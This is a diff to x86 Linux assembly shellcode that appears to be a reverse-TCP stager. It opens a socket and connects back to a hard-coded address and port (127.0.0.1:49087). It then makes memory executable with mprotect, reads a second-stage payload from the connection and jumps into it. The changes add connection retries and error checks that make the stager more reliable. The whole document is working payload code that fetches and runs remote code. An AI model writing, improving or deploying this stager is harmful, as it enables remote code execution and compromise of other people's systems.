@@ -33,11 +33,13 @@ BITS   32
 GLOBAL _start
 
 _start:
+	push 0x5              ; retry counter
+	pop esi
+
+create_socket:
 	xor  ebx, ebx
 	mul  ebx
-
-; int socket(int domain, int type, int protocol);
-socket:
+	; int socket(int domain, int type, int protocol);
 	push ebx              ; protocol = 0 = first that matches this type and domain, i.e. tcp
 	inc  ebx              ; 1 = SYS_SOCKET
 	push ebx              ; type     = 1 = SOCK_STREAM
@@ -47,13 +49,15 @@ socket:
 	int  0x80
 	xchg eax, edi
 
-; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-connect:
-	pop  ebx
+set_address:
+	pop ebx                    ; set ebx back to zero
 	push dword 0x0100007f ; addr->sin_addr = 127.0.0.1
 	push 0xbfbf0002       ; addr->sin_port = 49087
 	                      ; addr->sin_family = 2 = AF_INET
 	mov  ecx, esp         ; ecx = addr
+
+; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+try_connect:
 	push byte 0x66        ; __NR_socketcall
 	pop  eax
 	push eax              ; addrlen
@@ -63,7 +67,12 @@ connect:
 	inc  ebx              ; 3 = SYS_CONNECT
 	int  0x80
 	test eax, eax
-  js failed
+	jns mprotect
+
+handle_failure:
+	dec esi
+	jnz create_socket
+	jmp failed
 
 %ifndef USE_SINGLE_STAGE
 
@@ -76,6 +85,8 @@ mprotect:
 	shl  ebx, 12
 	mov  al, 0x7d         ; __NR_mprotect
 	int  0x80
+	test eax, eax
+	js failed
 
 ; ssize_t read(int fd, void *buf, size_t count);
 recv:
@@ -85,6 +96,8 @@ recv:
 	mov  dh, 0xc          ; count = 0xc00
 	mov  al, 0x3          ; __NR_read
 	int  0x80
+	test eax, eax
+	js failed
 	jmp  ecx
 
 failed:
